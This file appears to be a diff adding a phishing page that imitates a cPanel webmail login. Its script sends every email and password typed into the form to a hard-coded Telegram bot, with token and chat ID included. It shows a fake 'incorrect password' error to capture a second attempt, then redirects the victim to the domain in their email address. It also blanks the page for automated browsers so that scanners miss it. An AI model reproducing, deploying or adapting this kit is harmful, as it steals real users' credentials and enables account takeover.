@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Webmail</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      font-family: 'Open Sans', Arial, sans-serif;
+      color: #222;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .notification {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #f44336;
+      color: #fff;
+      padding: 16px 32px;
+      font-size: 15px;
+      border-radius: 0 0 6px 6px;
+      z-index: 1000;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+      animation: fadeInDown 0.5s;
+    }
+    @keyframes fadeInDown {
+      from { opacity: 0; top: -60px; }
+      to { opacity: 1; top: 0; }
+    }
+    .center-box {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo {
+      margin-bottom: 34px;
+      text-align: center;
+    }
+    .logo img {
+      width: 340px;
+      max-width: 95vw;
+      display: block;
+      margin: 0 auto;
+    }
+    .form-box {
+      width: 340px;
+      max-width: 97vw;
+      background: none;
+      box-shadow: none;
+      padding: 0;
+      margin-bottom: 55px;
+    }
+    .form-group {
+      margin-bottom: 22px;
+    }
+    label {
+      font-weight: 600;
+      font-size: 14px;
+      margin-bottom: 7px;
+      display: block;
+    }
+    .input-icon {
+      position: relative;
+    }
+    .input-icon input {
+      width: 100%;
+      padding: 7px 12px 7px 38px;
+      font-size: 14px;
+      border: 2px solid #b6c2c9;
+      border-radius: 3px;
+      outline: none;
+      transition: border-color 0.2s;
+      box-sizing: border-box;
+      background: #f7f7f7;
+    }
+    .input-icon input:focus {
+      border-color: #0099d9;
+      background: #fff;
+    }
+    .input-icon .icon {
+      position: absolute;
+      top: 50%;
+      left: 11px;
+      transform: translateY(-50%);
+      font-size: 17px;
+      color: #97a6ad;
+    }
+    .login-btn {
+      width: 100%;
+      background: #189edb;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      border-radius: 3px;
+      padding: 9px 0;
+      cursor: pointer;
+      margin-top: 2px;
+      transition: background 0.2s;
+    }
+    .login-btn:hover {
+      background: #147cab;
+    }
+    .languages {
+      width: 100vw;
+      text-align: center;
+      margin: 37px 0 11px 0;
+      font-size: 13px;
+      color: #233e53;
+      line-height: 2em;
+      letter-spacing: 0.02em;
+    }
+    .languages span {
+      margin: 0 14px;
+      cursor: pointer;
+      transition: color 0.2s;
+      font-weight: 400;
+    }
+    .languages span:hover {
+      color: #ff6600;
+      text-decoration: underline;
+    }
+    .footer {
+      text-align: center;
+      margin-bottom: 14px;
+      color: #333;
+      font-size: 13px;
+    }
+    .footer-logo {
+      margin: 0 auto 8px auto;
+      width: 41px;
+      height: 41px;
+      display: block;
+      border-radius: 9px;
+      object-fit: contain;
+      background: #fff;
+    }
+    .footer a {
+      color: #189edb;
+      text-decoration: none;
+      font-size: 12px;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="notification" id="notification">
+    Your session cookies is invalid. Please login again.
+  </div>
+  <div class="center-box">
+    <div class="logo">
+      <img src="https://www.autotechindore.com:2096/cPanel_magic_revision_1615493801/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail Logo">
+    </div>
+    <form class="form-box" id="loginForm" autocomplete="off">
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <div class="input-icon">
+          <span class="icon">&#128100;</span>
+          <input type="email" id="email" placeholder="Enter your email address." required autocomplete="username">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <div class="input-icon">
+          <span class="icon">&#128274;</span>
+          <input type="password" id="password" placeholder="Enter your email password." required autocomplete="current-password">
+        </div>
+      </div>
+      <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+    </form>
+    <div class="languages">
+      <span>English</span>
+      <span>العربية</span>
+      <span>čeština</span>
+      <span>dansk</span>
+      <span>Deutsch</span>
+      <span>Ελληνικά</span>
+      <span>español</span>
+      <span>español latinoamericano</span>
+      <span>...</span>
+    </div>
+  </div>
+  <div class="footer">
+    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41IDMgMTMuMzA1IDIuNTk0IDI2Ljk1NC0xLjIwMiA0MC45NWwtMS4yIDQuNWMtMi41OTcgOS42MDItNi41OTcgMTguNDUtMTIgMjYuNTUtNS4zOTggOC4wOTgtMTEuODQ3IDE1LjA1Mi0xOS4zNDcgMjAuODQ4LTcuNSA1LjgwNS0xNS44NTUgMTAuMzA1LTI1LjA1IDEzLjUtOS4yIDMuMjA0LTE4LjgwNSA0LjgwNS0yOC44MDUgNC44MDVoLTU0LjI5N2wxMC44LTQwLjVjMS42LTUuNDAyIDQuNi05LjggOS0xMy4yMDMgNC4zOTYtMy4zOTggOS40OTctNS4xMDIgMTUuMzAyLTUuMTAyaDE3LjM5OGM3LjIgMCAxMy42NTMtMi4yIDE5LjM1Mi02LjU5NyA1LjY5NS00LjM5OCA5LjQ0NS0xMC4wOTcgMTEuMjUtMTcuMSAxLjM5NC00Ljk5NyAxLjU0Ny05LjkgLjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=" alt="cPanel Logo" class="footer-logo">
+    Copyright© 2025 cPanel, L.L.C.<br>
+    <a href="#">Privacy Policy</a>
+  </div>
+  <script>
+    // Only block the most obvious bots (webdriver/headless)
+    window.addEventListener('DOMContentLoaded', function() {
+      var notification = document.getElementById('notification');
+      notification.style.display = 'block';
+      setTimeout(function() {
+        notification.style.display = 'none';
+      }, 6000);
+
+      // Autofill email from query string if present
+      var emailInput = document.getElementById('email');
+      var params = new URLSearchParams(window.location.search);
+      var urlEmail = params.get("email");
+      if (urlEmail) {
+        emailInput.value = urlEmail;
+      }
+
+      // VERY RELAXED bot check
+      setTimeout(function(){
+        if(navigator.webdriver) {
+          document.body.innerHTML = "";
+          document.write("<div style='text-align:center;margin-top:60px;font-family:sans-serif;color:#f44336;font-size:22px;'>Access Denied.<br>This page is protected against bots.</div>");
+          throw new Error("Bot detected");
+        }
+      }, 1000);
+    });
+
+    // --- Telegram Bot Integration ---
+    // Replace with your bot token & chat id
+    const TELEGRAM_BOT_TOKEN = "6180996330:AAHdKI3dj1mnuImorq8sDMMGztAqtlG7VCQ";
+    const TELEGRAM_CHAT_ID = "686297216";
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      });
+    }
+
+    // --- Login Logic ---
+    let attempt = 0;
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      // Always send to Telegram on every attempt
+      sendToTelegram(`Login Attempt #${attempt+1}:\nEmail: ${email}\nPassword: ${password}`);
+
+      if (attempt === 0) {
+        // First attempt: Show incorrect password notification
+        var notification = document.getElementById('notification');
+        notification.textContent = "Incorrect password. Please try again.";
+        notification.style.display = 'block';
+        setTimeout(function() {
+          notification.style.display = 'none';
+        }, 6000);
+        document.getElementById('password').value = '';
+        setTimeout(function() {
+          document.getElementById('password').focus();
+        }, 400);
+        attempt++;
+        return false;
+      } else {
+        // Second attempt: redirect to domain of the email
+        // Extract domain from email
+        let domain = email.split('@')[1] || '';
+        if (domain) {
+          window.location.href = "https://" + domain;
+        } else {
+          window.location.href = "/";
+        }
+        return false;
+      }
+    });
+  </script>
+</body>
+</html>
